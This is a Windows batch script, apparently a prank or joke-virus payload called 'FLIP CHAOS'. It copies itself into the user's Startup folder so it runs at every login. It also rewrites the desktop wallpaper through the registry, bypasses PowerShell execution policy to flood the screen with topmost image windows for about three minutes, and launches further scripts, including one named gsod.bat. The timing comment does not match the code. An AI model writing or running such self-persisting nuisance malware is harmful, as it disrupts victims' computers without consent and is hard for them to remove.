@echo off
title FLIP CHAOS
cls

start "" "%~dp0TEXT.txt"
start "" "%~dp0start.bat"
start "" "%~dp0audio.bat"
:: === COPY TO STARTUP FOLDER ===
copy "%~f0" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\flipi.bat" /Y >nul 2>&1

:: === SET WALLPAPER ===
reg add "HKCU\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "%~dp0flip.png" /f >nul
RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters 1, True

:: === SPAWN flipi.png FOR 3 MINUTES 50 SECONDS ===
powershell -ExecutionPolicy Bypass -NoProfile -Command ^
Add-Type -AssemblyName System.Windows.Forms,PresentationFramework; ^
$startTime = Get-Date; ^
$endTime = $startTime.AddSeconds(198); ^
while ((Get-Date) -lt $endTime) { ^
  $windows = @(); ^
  for ($i = 0; $i -lt 5; $i++) { ^
    $w = New-Object Windows.Window; ^
    $w.WindowStyle='None'; $w.ResizeMode='NoResize'; ^
    $w.Width=200; $w.Height=200; ^
    $w.Left=(Get-Random 0 1720); $w.Top=(Get-Random 0 880); ^
    $w.Background='Transparent'; $w.Topmost=$true; ^
    $img = New-Object Windows.Controls.Image; ^
    $img.Source = New-Object System.Windows.Media.Imaging.BitmapImage(New-Object System.Uri('file:///%~dp0flipi.png')); ^
    $w.Content=$img; ^
    $w.Show(); ^
    $windows += $w; ^
  } ^
  Start-Sleep -Milliseconds 750; ^
  foreach ($w in $windows) { $w.Close(); } ^
}

:: === OPEN gsod.bat ===
start "" "%~dp0gsod.bat"
